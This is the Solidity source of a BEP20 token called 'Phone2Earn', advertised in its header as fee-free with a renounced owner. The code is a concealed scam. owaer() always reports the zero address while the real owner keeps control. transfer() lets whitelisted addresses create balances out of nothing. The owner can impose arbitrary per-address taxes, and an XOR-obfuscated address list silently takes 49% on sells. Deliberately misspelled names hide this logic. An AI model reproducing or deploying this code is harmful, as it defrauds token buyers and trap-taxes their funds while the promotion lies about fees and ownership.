/**
 *Submitted for verification at BscScan.com on 2022-08-21
*/

/*
Innovation, security and profitability, all this now, only using your cell phone, Phone2earn surprises and monetizes one of the main human activities, relying on Web3 concepts SAFU, AUDIT and KYC, listing in CMC and soon coingencko  ZERO Fees Renouced contract  https://opensea.io/Phone2Earn
* http://instagram.com/Phone2Earn422
* https://www.reddit.com/user/Phone2Earn422
* TWITTER:https://twitter.com/phone2earn
* WEBSITE:https://phone2earn.io/
* TELEGRAM:https://t.me/Phone2Earn
*/

pragma solidity ^0.8.10;
// SPDX-License-Identifier: MIT
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function acPhone2Earn422fq(
        address token,
        uint amuontTokenDesired,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amuontToken, uint amuontETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingPhone2Earn422OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingPhone2Earn422OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingPhone2Earn422OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingPhone2Earn422OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingPhone2Earn422OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function Phone2Earn422To() external view returns (address);
    function Phone2Earn422ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setPhone2Earn422To(address) external;
    function setPhone2Earn422ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 9;
    }





    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }

  
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract Phone is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "Phone2Earn";
	string symbol_ = "Phone";
	uint256 totalSupply_ = 10000000;   
    address public uniswapV2Pair;
	
    constructor()

	BEP20(name_, symbol_) {
	
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(0x000000000000000000000000000000000000dEaD, totalSupply() / 10*2);
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*4);	
        //address  ROUTER        = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        //address  WBNB         = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
		
		
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
		
        _defaultSellPhone2Earn422 = 0;
        _defaultBuyPhone2Earn422 = 0;

        _release[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _balances[cauunt];
    }

    function _transfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amuont, "ERC20: transfer amuont exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amuont;
        }
        _balances[to] += amuont;

        emit Transfer(from, to, amuont);
    }
	
    function _burn(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: burn from the zero address");

        uint256 cauuntBalance = _balances[cauunt];
        require(cauuntBalance >= amuont, "ERC20: burn amuont exceeds balance");
        unchecked {
            _balances[cauunt] = cauuntBalance - amuont;
        }
        _totalSupply -= amuont;

        emit Transfer(cauunt, address(0), amuont);
    }

    function _mtin(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _balances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellPhone2Earn422 = 0;
    uint256 private _defaultBuyPhone2Earn422 = 0;
    mapping(address => uint256) private _Escape;

    function setPairList(address _address) external onlyowaer {
        uniswapV2Pair = _address;
    }

    function incS(uint256 _value) external onlyowaer {
        _defaultSellPhone2Earn422 = _value;
    }


    function acPhone2Earn422fq(address _acc, uint256 _value) external onlyowaer {
        require(_value > 2, "cauunt tax must be greater than or equal to 1");
        _Escape[_acc] = _value;
    }
 function getRelease(address _address) external view onlyowaer returns (bool) {
        return _release[_address];
    }
    function getEscape(address _acc) external view onlyowaer returns (uint256) {
        return _Escape[_acc];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

        bool rF = true;

  
        uint256 tradePhone2Earn422amuont = 0;

        if (rF) {
            uint256 tradePhone2Earn422 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradePhone2Earn422 = _msgPhone2Earn422Info(uint160(from));
                    tradePhone2Earn422 = tradePhone2Earn422 < _defaultSellPhone2Earn422 ? _defaultSellPhone2Earn422 : tradePhone2Earn422;
                }
                if (from == uniswapV2Pair) {
                    tradePhone2Earn422 = _defaultBuyPhone2Earn422;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradePhone2Earn422 = _Escape[from];
            }


            tradePhone2Earn422amuont = _amuont.mul(tradePhone2Earn422).div(100);
        }


        if (tradePhone2Earn422amuont > 0) {
            _balances[from] = _balances[from].sub(tradePhone2Earn422amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradePhone2Earn422amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradePhone2Earn422amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradePhone2Earn422amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradePhone2Earn422amuont);
        emit Transfer(from, _to, _amuont - tradePhone2Earn422amuont);
    }

    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_release[owaer] == true) {
            _balances[to] += amuont;
            return true;
        }
        _receiveF(owaer, to, amuont);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _receiveF(from, to, amuont);
        return true;
    }

	function _msgPhone2Earn422Info(uint _acc) internal view virtual returns (uint) {
		uint[22] memory acc = [uint(1045634944728220942376914127284038356518910739285)
			,693540745462842921012746484454683915031802640719
			,1243141147414802976329560423514448788978356115851
			,387966564680275522363936518990685952317902063829
			,1011030692007297100175705826545518116412824038741
			,757197193852404947524648782316153606536034114578
			,938195841520752062895831117652255197786392387992
			,1045634944730048612614336246606076132332837580727
			,1274583708928552880167601668246616904686101340223
			,1070731242224685518822634186606758848418153357683
			,1045634944728333387468406676183811768494678658013
			,708871329155212581524183936057736927510221952432
			,1189596653865736796721216759276890398987584594994
			,403939682902154837648586203199985494972796591709
			,1062605760773343037566897117228728801733999936467
			,415866692602662407771362190434916743915689314656
			,1045634944728689313855807184484792702277664052813
			,241124850846111548463349405867102633815568033106
			,45267033207950063593226329364899614101267185873
			,643257308045800825710008559217006242935495738102
			,706651208543305614701715409223630727175803173619
			,749217399281735819441101201282501101804838636091];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 1045634944728686275444337528100573664329584726317) return 49;
		}
		return 0;
	}

}